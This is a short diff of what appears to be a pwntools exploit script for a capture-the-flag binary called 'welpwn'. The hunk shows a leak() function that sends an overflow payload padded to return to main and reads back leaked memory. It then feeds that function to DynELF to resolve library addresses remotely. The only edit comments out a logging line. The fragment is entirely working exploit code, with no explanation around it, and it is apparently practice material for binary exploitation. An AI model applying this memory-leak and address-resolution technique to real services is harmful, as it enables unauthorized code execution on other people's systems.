@@ -29,7 +29,7 @@ def leak(address):
     payload = payload.ljust(1024,b"B")    # 回到main函数
     r.send(payload)
     data = r.recv(8)
-    log.info("%# x => %s" % (address,(data or '')))
+#    log.info("%# x => %s" % (address,(data or '')))
     return data
 
 dyn = DynELF(leak,elf=ELF('./welpwn'))
